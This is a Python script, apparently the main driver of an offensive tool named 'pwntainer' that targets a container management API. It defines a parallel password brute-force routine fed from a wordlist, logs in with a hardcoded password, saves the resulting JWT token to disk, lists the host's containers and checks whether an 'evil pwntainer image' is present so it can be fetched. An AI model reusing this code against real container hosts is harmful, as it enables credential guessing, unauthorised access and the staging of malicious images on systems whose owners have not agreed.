from multiprocessing import Pool
import sys
from pprint import pprint

from modules import auth
from modules import containers
from modules import image

# Initialize the authentication object and supply host address and positional argument
a = auth.Auth(sys.argv[1])


def bruteforce(pw_list):
	with open(pw_list) as pass_list:
		passwords = pass_list.readlines()

	with Pool(4) as pool:
		results = pool.map(a.login, passwords)
		print(results)

def list_containers():
	cont = containers.Containers(sys.argv[1], 1)
	return cont.list_containers()

def check_image(name):
	img = image.Image(sys.argv[1], sys.argv[2])
	images = []
	for imag in img.list_images():
		images.append(imag['RepoTags'])
	for im in images:
		if name in str(im[0]):
			return True
		else:
			pass

def pull_image(name):
	img = image.Image(sys.argv[1], 1)
	img.pull_image(name)



def main():
	#print("[*] Starting pwntainer bruteforce")
	#bruteforce("./data/wordlist.txt")
	
	creds = a.login("screature") #currently uses hardcoded crendential to test different endpoints.
	with open("./data/auth.token", 'w') as token:
		token.write(a.get_jwt())
	print("[*] Getting a list of containers...")
	containers = list_containers()
	print("[+] List of containers successfully retrieved...")
	print("\n")
	print("[*] Checking if the evil pwntainer image exists...")
	if check_image("ubuntu:18.04"):
		print("[+] Pwntainer evil image exists")
	else:
		print("[-] Evil pwnstainer image not found, fetching...")



if __name__=="__main__":
	main()